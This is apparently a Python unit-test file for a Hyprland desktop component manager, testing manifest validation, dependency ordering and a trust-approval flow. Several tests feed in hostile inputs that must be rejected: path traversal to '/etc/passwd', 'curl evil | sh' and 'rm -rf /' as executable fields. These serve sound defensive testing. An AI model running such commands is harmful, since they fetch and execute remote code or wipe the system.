import json
import shutil
import tempfile
import unittest
from pathlib import Path

from hyprown.manifest import ManifestError, discover, load_packages, parse_component
from hyprown.registry import Registry
from hyprown.resolver import ResolveError, order
from tests.helpers import REPO, Env


def write_manifest(dirpath: Path, text: str) -> Path:
    dirpath.mkdir(parents=True, exist_ok=True)
    f = dirpath / "component.toml"
    f.write_text(text, encoding="utf-8")
    return f


GOOD = '''schema = 1
id = "demo"
name = "Demo"
version = "1.0.0"
summary = "x"
kind = "widget"
'''


class RepoManifests(unittest.TestCase):
    def test_all_repo_manifests_valid(self):
        with Env() as e:
            reg = Registry(e.ctx)
            self.assertEqual(reg.errors, [])
            self.assertGreaterEqual(len(reg.components), 7)

    def test_every_component_package_is_known(self):
        pk = load_packages(REPO / "manifests/packages.toml")
        with Env() as e:
            for c in Registry(e.ctx).components.values():
                for p in c.pkg_required + c.pkg_recommended:
                    self.assertIn(p, pk)

    def test_links_sources_exist_in_repo(self):
        with Env() as e:
            for c in Registry(e.ctx).components.values():
                for ln in c.links:
                    self.assertTrue((REPO / ln.src).exists(), f"{c.id}: нет {ln.src}")

    def test_order_adds_dependencies_first(self):
        with Env() as e:
            reg = Registry(e.ctx)
            ids = order(reg, ["manager"])
            self.assertEqual(ids, ["desktop-core", "quickshell-shell", "manager"])

    def test_order_unknown_and_cycle(self):
        with Env() as e:
            reg = Registry(e.ctx)
            with self.assertRaises(ResolveError):
                order(reg, ["nope"])
            reg.components["desktop-core"].requires = ["manager"]
            with self.assertRaises(ResolveError):
                order(reg, ["manager"])

    def test_hyprland_source_is_known_copr(self):
        pk = load_packages(REPO / "manifests/packages.toml")
        self.assertEqual(pk["hyprland"].sources[0]["id"], "sdegler/hyprland")


class Validation(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.pk = load_packages(REPO / "manifests/packages.toml")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def parse(self, extra="", trusted=True):
        f = write_manifest(self.tmp / "demo", GOOD + extra)
        return parse_component(f, self.pk, trusted, trusted)

    def test_minimal_valid(self):
        self.assertEqual(self.parse().id, "demo")

    def test_rejects_path_traversal_in_link_src(self):
        with self.assertRaises(ManifestError):
            self.parse('[[links]]\nname="a"\nsrc="../etc/passwd"\ndst="@config/x"\n')

    def test_rejects_absolute_link_dst(self):
        with self.assertRaises(ManifestError):
            self.parse('[[links]]\nname="a"\nsrc="hypr"\ndst="/etc/passwd"\n')

    def test_rejects_unknown_package(self):
        with self.assertRaises(ManifestError):
            self.parse('[packages]\nrequired=["rm-rf-everything"]\n')

    def test_rejects_unknown_activation_and_kind(self):
        with self.assertRaises(ManifestError):
            self.parse('[activation]\nmode="run-shell"\n')
        with self.assertRaises(ManifestError):
            write_manifest(self.tmp / "d2", GOOD.replace("widget", "virus"))
            parse_component(self.tmp / "d2/component.toml", self.pk, True, True)

    def test_untrusted_cannot_request_system_files_or_copr(self):
        with self.assertRaises(ManifestError):
            self.parse('[session]\nsystem_files = true\n', trusted=False)
        with self.assertRaises(ManifestError):
            self.parse('permissions=["copr"]\n', trusted=False)

    def test_no_executable_fields_are_honoured(self):
        c = self.parse('run = "curl evil | sh"\n[install]\ncommand = "rm -rf /"\n')
        self.assertFalse(hasattr(c, "run") or hasattr(c, "command"))


class TrustFlow(unittest.TestCase):
    def test_untrusted_needs_approval_and_hash_change_revokes(self):
        from hyprown.manifest import approve
        with Env() as e:
            cat = e.ctx.user_catalog_dir
            f = write_manifest(cat / "demo", GOOD)
            reg = Registry(e.ctx)
            comp = reg.components["demo"]
            self.assertFalse(comp.trusted)
            self.assertFalse(comp.approved)
            with self.assertRaises(ResolveError):
                order(reg, ["demo"])
            approve(e.ctx, comp)
            self.assertTrue(Registry(e.ctx).components["demo"].approved)
            f.write_text(GOOD + "\n# изменено\n", encoding="utf-8")
            self.assertFalse(Registry(e.ctx).components["demo"].approved)

    def test_untrusted_cannot_shadow_trusted_id(self):
        with Env() as e:
            write_manifest(e.ctx.user_catalog_dir / "evil", GOOD.replace('"demo"', '"desktop-core"'))
            reg = Registry(e.ctx)
            self.assertTrue(reg.components["desktop-core"].trusted)
            self.assertTrue(any("уже занят" in x for x in reg.errors))

    def test_broken_manifest_does_not_hide_others(self):
        with Env() as e:
            write_manifest(e.ctx.user_catalog_dir / "broken", "id = [")
            reg = Registry(e.ctx)
            self.assertTrue(reg.errors)
            self.assertIn("desktop-core", reg.components)


if __name__ == "__main__":
    unittest.main()
